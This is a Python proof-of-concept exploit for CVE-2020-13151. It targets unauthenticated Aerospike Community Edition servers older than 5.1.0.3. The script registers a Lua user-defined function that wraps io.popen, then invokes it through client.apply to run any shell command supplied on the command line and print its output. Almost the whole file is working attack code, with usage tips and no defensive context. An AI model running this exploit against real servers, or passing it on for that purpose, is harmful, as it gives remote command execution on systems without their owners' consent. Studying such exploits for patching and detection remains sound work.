#!/usr/bin/env python3
"""CVE-2020-13151 — Aerospike CE < 5.1.0.3 unauthenticated command execution.

Registers a Lua module that calls io.popen() and invokes it through client.apply().
stdout of the command comes back on the same socket; stderr is discarded, so append
2>&1 to the command if you need to see errors.

Run as your normal user, not root: pip3 --user installs into ~/.local, which root's
Python does not read.
"""
import argparse, os, random, string, sys
import aerospike

UDF_SRC = """function runCMD(rec, cmd)
    local handle = io.popen(cmd)
    local out = handle:read("*a")
    handle:close()
    return out
end
"""

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ahost", default="192.168.150.143")
    ap.add_argument("--aport", type=int, default=3000)
    ap.add_argument("--namespace", default="test")
    ap.add_argument("--setname", default="cve202013151")
    ap.add_argument("--udf", default="poc.lua")
    ap.add_argument("--cmd", required=True)
    a = ap.parse_args()

    open(a.udf, "w").write(UDF_SRC)

    client = aerospike.client({
        "hosts": [(a.ahost, a.aport)],
        "policies": {"timeout": 8000, "total_timeout": 8000, "socket_timeout": 8000},
    }).connect()

    print("[+] build:", list(client.info_all("build").values())[0][1].strip())

    key = ("".join(random.choice(string.ascii_lowercase) for _ in range(16)))
    client.put((a.namespace, a.setname, key), {"pk": key})   # needs a record to attach to
    client.udf_put(a.udf)                                     # register module 'poc'
    print("[+] executing:", a.cmd)
    print(client.apply((a.namespace, a.setname, key), "poc", "runCMD", [a.cmd]))
    client.close()

if __name__ == "__main__":
    main()
